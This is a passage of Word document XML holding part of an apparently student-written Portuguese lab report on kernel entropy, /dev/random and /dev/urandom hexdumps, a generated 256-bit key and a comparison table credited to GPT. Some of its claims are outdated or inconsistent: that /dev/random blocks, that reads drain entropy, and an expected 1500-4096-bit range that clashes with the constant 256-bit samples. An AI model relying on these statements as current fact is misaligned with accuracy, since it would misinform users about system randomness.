    </w:p>
    <w:p w14:paraId="5EF44ADF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Chave não encontrada no intervalo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE93B14" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Demonstração executada (quebra completa demoraria ~10-30 segundos)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8C67F2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="777CAE84" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Tarefa 3 — Medição da entropia do kernel (resumo extraído)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053FE4AF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Medir a Entropia do Kernel</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>=====================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F34C23F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>A medir níveis de entropia:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260CDF54" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Amostra 1: 256 bits</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Amostra 2: 256 bits</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Amostra 3: 256 bits</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Amostra 4: 256 bits</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Amostra 5: 256 bits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E0577B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>OBSERVAÇÕES:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- A entropia normalmente varia entre 1500-4096 bits</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Fontes: temporização do teclado, movimento do rato, I/O de disco, interrupções</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Movimento do rato: impacto ALTO (100-200 bits/seg)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Escrever no teclado: impacto MÉDIO-ALTO (50-150 bits/seg)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- I/O de disco: impacto MÉDIO (30-80 bits/seg)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Sistema inativo: impacto BAIXO (10-50 bits/seg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7788EBD6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5ACC6EFF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Fontes de entropia ordenadas por eficácia:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  1. Movimento do rato (mais eficaz)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  2. Escrever no teclado</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  3. Atividade de rede</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  4. I/O de disco</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  5. Interrupções do sistema</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCB0905" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Amostras de entropia (extraídas):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B260398" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Amostra 1: 256 bits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C64C4F2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Amostra 2: 256 bits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E452E1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Amostra 3: 256 bits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724C48D8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Amostra 4: 256 bits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73936EC4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>Amostra 5: 256 bits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0D4F68" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="6BAC52DF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Tarefa 4 — /dev/random (excerto do dump)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF42C39" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="4E51603F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>00000000  bc 52 38 d6 c9 2a 65 17  8b e7 34 9e 8b 6e 34 8c  |.R8..*e...4..n4.|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E62D0D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>00000010  db ca 0c 50 40 65 6b cf  65 22 97 54 b5 e8 46 5e  |...P@ek.e".T..F^|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735B0F3B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>00000020</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07643D87" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Observações (Tarefa 4):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B991785" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>/dev/random é um dispositivo BLOQUEANTE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B281AFD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Bloqueia quando o pool de entropia esgota-se</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA0354D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>A entropia diminui com cada leitura</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69299932" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Commarcadores"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Requer actividade do utilizador (rato/teclado) para continuar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE70547" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="68C26722" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04FB6463" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Tarefa 5 — /dev/urandom e geração de chave (resumo)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B46E60F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="29F49ADA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>00000000  d3 35 a0 d5 82 36 58 90  95 f6 60 f4 50 73 16 3a  |.5...6X...`.Ps.:|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E56906" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>00000010  c3 07 11 ea ed 99 5c 53  e4 17 59 4c e7 4a b5 a2  |......\S..YL.J..|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FADE21" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>00000020</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01284E64" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Chave de 256 bits (extraída):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025400DD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>08f4670920c02442d04c937f296eaa55</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB1CA0B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>80cdf69207ce1e2ac43b1f42d7c21f5f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA0F055" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
        </w:rPr>
        <w:t>Comparação resumida (/dev/random vs /dev/urandom) – Tabela pelo GPT</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="8484" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="10" w:type="dxa"/>
          <w:right w:w="10" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="0000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2825"/>
        <w:gridCol w:w="2820"/>
        <w:gridCol w:w="2839"/>
      </w:tblGrid>
      <w:tr w:rsidR="004253CC" w14:paraId="61FE8C29" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2825" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4472C4"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="1F30C06D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Característica</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2820" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4472C4"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="2C52DD61" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/dev/random</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2839" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4472C4"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="0203AC88" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/dev/urandom</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="67926143" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2825" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="7D53E7EB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Característica</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2820" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="16F53037" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/dev/random</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2839" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="57475B9C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/dev/urandom</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="7966775B" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2825" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="75AA2F43" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Bloqueante</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2820" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="1CE41B12" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SIM (quando baixo)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2839" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="75EF5395" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>NÃO (nunca bloqueia)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="1B5385B4" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2825" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="6AFDE48D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Consumo de entropia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2820" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="2935F73A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Diminui o pool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2839" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="165A253E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Não diminui</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="3979D681" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2825" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="6E3D1D7C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
